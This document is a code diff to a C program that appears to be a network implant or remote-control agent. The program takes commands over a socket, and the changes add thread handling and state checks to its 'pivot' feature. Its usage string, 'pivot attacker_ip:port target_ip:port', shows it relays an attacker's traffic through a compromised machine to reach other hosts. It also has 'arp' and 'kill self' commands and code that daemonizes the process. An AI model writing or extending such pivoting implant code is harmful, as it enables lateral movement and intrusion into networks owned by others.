@@ -23,6 +23,15 @@
 int sockfd, newsockfd;
 pthread_t pivot_thread_id = NULL;
 
+void* pivot_thread(void *pinput){
+    if(pivot(pinput) < 0){
+        check_socket_write(write(newsockfd, "pivot creation problem!\n", 24));
+    }
+    return NULL;
+    error:
+        return NULL;
+}
+
 void PREFIX_pivot(char *argv, int argc) {
     struct PivotInput *in = NULL;
     char *pch = NULL;
@@ -31,10 +40,15 @@ void PREFIX_pivot(char *argv, int argc) {
     char *target = NULL;
     char *target_token = NULL;
     char def[] = "Pivot command usage: pivot attacker_ip:port target_ip:port\n";
+    char running_msg[] = "Pivot already running please issue kill pivot first\n";
     int thread_error;
 
     if (argc < 2 || argc > 2) {
         check_socket_write(write(newsockfd, &def, strlen(def)));
+        return;
+    }
+    if(pivot_running){
+        check_socket_write(write(newsockfd, &running_msg, strlen(running_msg)));
         return;
     }
     in = malloc(sizeof(struct PivotInput));
@@ -109,7 +123,7 @@ void PREFIX_pivot(char *argv, int argc) {
         }
         target_token = strtok(NULL, ":");
     }
-    thread_error = pthread_create(&pivot_thread_id, NULL, pivot, (void *) in);
+    thread_error = pthread_create(&pivot_thread_id, NULL, pivot_thread, (void *) in);
     if (thread_error != 0) {
         log_err("cant create thread");
         set_zero_errno();
@@ -179,11 +193,17 @@ void PREFIX_arp(char *argv, int argc) {
 void PREFIX_kill(char *argv, int argc) {
     if (argc == 1) {
         if (strcmp(argv, "pivot") == 0) {
-            if (kill_pivot() == 0) {
-                check_socket_write(write(newsockfd, "Pivot killed\n", 13));
+            if (pivot_running) {
+                if (kill_pivot() == 0) {
+                    pivot_running = false;
+                    check_socket_write(write(newsockfd, "Pivot killed\n", 13));
+                }
+                else {
+                    check_socket_write(write(newsockfd, "Error.\n", 7));
+                }
             }
-            else {
-                check_socket_write(write(newsockfd, "Error.\n", 7));
+            else{
+                check_socket_write(write(newsockfd, "Pivot not running\n", 18));
             }
         }
         else if (strcmp(argv, "self") == 0) {
@@ -276,6 +296,7 @@ int main(int argc, char *argv[]) {
     char buffer[256];
     struct sockaddr_in serv_addr, cli_addr;
     ssize_t n;
+    pivot_running = false;
 
 #ifdef DAEMON   //code to daemonize the process
     /* Our process ID and Session ID */
